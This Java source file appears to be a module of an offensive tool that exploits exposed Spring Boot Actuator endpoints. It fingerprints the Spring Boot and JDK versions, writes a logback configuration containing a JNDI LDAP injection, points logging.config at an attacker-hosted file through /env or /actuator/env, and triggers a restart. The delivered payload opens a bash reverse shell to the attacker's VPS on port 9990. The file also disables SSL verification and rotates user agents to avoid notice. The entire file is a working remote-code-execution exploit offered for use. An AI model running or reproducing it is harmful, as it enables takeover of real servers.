package src.main.module;

import src.main.common.UA_Config;
import src.main.impl.ResultCallback;

import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class LoggingConfigRCE {
    private String address;
    public  String text;
    private String vpsIP;
    private String vpsPort;
    public String expdata1 = "logging.config=http://%s/LoggingConfigJNDI.xml";
    public String expdata2 = "{\"name\":\"logging.config\",\"value\":\"http://%s/LoggingConfigJNDI.xml\"}";
    public String jndipayload = "<configuration>\n" +
            "    <insertFromJNDI env-entry-name=\"ldap://%s:1389/TomcatBypass/Command/Base64/%s\" as=\"appName\" />\n" +
            "</configuration>";
    public String shellpayload = "bash -i >&/dev/tcp/%s/9990 0>&1";

    public LoggingConfigRCE(String address,String vpsIP,String vpsPort){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPort = vpsPort;
    }

    public void Result1(ResultCallback callback){
        String llib = "jdk";
        String api = "/env";
        String resapi = "/restart";
        String site = address + api;
        String resite = address + resapi;
        String ua = "";
        String data = "";
        disableSSLVerification();
        try {
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            conn.setDoOutput(true);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib)) {
                String regex = llib+ "(\\d+\\.\\d+\\.\\d+_\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                if (matcher.find()) {
                    text = "当前jdk版本为: " + matcher.group(1);
                    callback.onResult(text);
                    try {
                        URL obj1 = new URL(site);
                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                        ua = uacf.getRandomUserAgent(ualist);
                        conn1.setRequestProperty("User-Agent", ua);
                        conn1.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                        conn1.setRequestMethod("POST");
                        conn1.setDoOutput(true);
                        FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/LoggingConfigJNDI.xml");
                        Scanner sc = new Scanner(System.in);
                        String b64payload = Base64.getEncoder().encodeToString(String.format(shellpayload,vpsIP).getBytes());
                        String exp = String.format(jndipayload,vpsIP,b64payload.replace("+","%2B"));
                        data = String.format(expdata1,vpsIP);
                        writer.write(exp);
                        sc.close();
                        writer.close();
                        text = "LoggingConfigJNDI.xml文件写入成功";
                        callback.onResult(text);
                        try (OutputStream os = conn1.getOutputStream()) {
                            byte[] input = data.getBytes(StandardCharsets.UTF_8);
                            os.write(input, 0, input.length);
                        }
                        int responseCode1 = conn1.getResponseCode();
                        if (responseCode1 == HttpURLConnection.HTTP_OK) {
                            try {
                                URL obj2 = new URL(resite);
                                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                                ua = uacf.getRandomUserAgent(ualist);
                                conn2.setRequestProperty("User-Agent", ua);
                                conn2.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                                conn2.setRequestMethod("POST");
                                conn2.setDoOutput(true);
                                int responseCode2 = conn2.getResponseCode();
                                if (responseCode2 == HttpURLConnection.HTTP_OK) {
                                    text = "执行命令成功，请在反弹服务器上查看";
                                    callback.onResult(text);
                                    text = "当前反弹vpsIP: " + vpsIP + " " + "vpsPort: 9990";
                                    callback.onResult(text);
                                } else {
                                    text = "发送请求失败，请重试";
                                    callback.onResult(text);
                                }
                            } catch (Exception e) {
                                text = "异常：发起refresh请求失败";
                                callback.onResult(text);
                                e.printStackTrace();
                            }
                        }
                    } catch (Exception e) {
                        text = "异常: 发起env请求失败";
                        callback.onResult(text);
                        e.printStackTrace();
                    }
                }else{
                    text = "未找到依赖";
                    callback.onResult(text);
                }
            }else{
                text = "发起请求失败";
                callback.onResult(text);
            }
        }catch (Exception e) {
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result2(ResultCallback callback){
        String llib = "jdk";
        String api = "/actuator/env";
        String resapi = "/actuator/restart";
        String site = address + api;
        String resite = address + resapi;
        String ua = "";
        String data = "";
        disableSSLVerification();
        try {
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            conn.setDoOutput(true);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib)) {
                String regex = llib+ "(\\d+\\.\\d+\\.\\d+_\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                if (matcher.find()) {
                    text = "当前jdk版本为: " + matcher.group(1);
                    callback.onResult(text);
                    try {
                        URL obj1 = new URL(site);
                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                        ua = uacf.getRandomUserAgent(ualist);
                        conn1.setRequestProperty("User-Agent", ua);
                        conn1.setRequestProperty("Content-Type", "application/json");
                        conn1.setRequestMethod("POST");
                        conn1.setDoOutput(true);
                        FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/LoggingConfigJNDI.xml");
                        Scanner sc = new Scanner(System.in);
                        String b64payload = Base64.getEncoder().encodeToString(String.format(shellpayload,vpsIP).getBytes());
                        String exp = String.format(jndipayload,vpsIP,b64payload.replace("+","%2B"));
                        data = String.format(expdata2,vpsIP);
                        writer.write(exp);
                        sc.close();
                        writer.close();
                        text = "LoggingConfigJNDI.xml文件写入成功";
                        callback.onResult(text);
                        try (OutputStream os = conn1.getOutputStream()) {
                            byte[] input = data.getBytes(StandardCharsets.UTF_8);
                            os.write(input, 0, input.length);
                        }
                        int responseCode1 = conn1.getResponseCode();
                        if (responseCode1 == HttpURLConnection.HTTP_OK) {
                            try {
                                URL obj2 = new URL(resite);
                                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                                ua = uacf.getRandomUserAgent(ualist);
                                conn2.setRequestProperty("User-Agent", ua);
                                conn2.setRequestProperty("Content-Type", "application/json");
                                conn2.setRequestMethod("POST");
                                conn2.setDoOutput(true);
                                int responseCode2 = conn2.getResponseCode();
                                if (responseCode2 == HttpURLConnection.HTTP_OK) {
                                    text = "执行命令成功，请在反弹服务器上查看";
                                    callback.onResult(text);
                                    text = "当前反弹vpsIP: " + vpsIP + " " + "vpsPort: 9990";
                                    callback.onResult(text);
                                } else {
                                    text = "发送请求失败，请重试";
                                    callback.onResult(text);
                                }
                            } catch (Exception e) {
                                text = "异常：发起refresh请求失败";
                                callback.onResult(text);
                                e.printStackTrace();
                            }
                        }
                    } catch (Exception e) {
                        text = "异常: 发起env请求失败";
                        callback.onResult(text);
                        e.printStackTrace();
                    }
                }else{
                    text = "未找到依赖";
                    callback.onResult(text);
                }
            }else{
                text = "发起请求失败";
                callback.onResult(text);
            }
        }catch (Exception e) {
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Exp(ResultCallback callback){
        String api = "/actuator/env";
        String site = address + api;
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                text = "当前版本为springboot2";
                callback.onResult(text);
                Result2(callback);
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
                callback.onResult("当前版本为springboot1");
                Result1(callback);
            }else{
                text = "未识别springboot版本";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测springboot版本异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
}
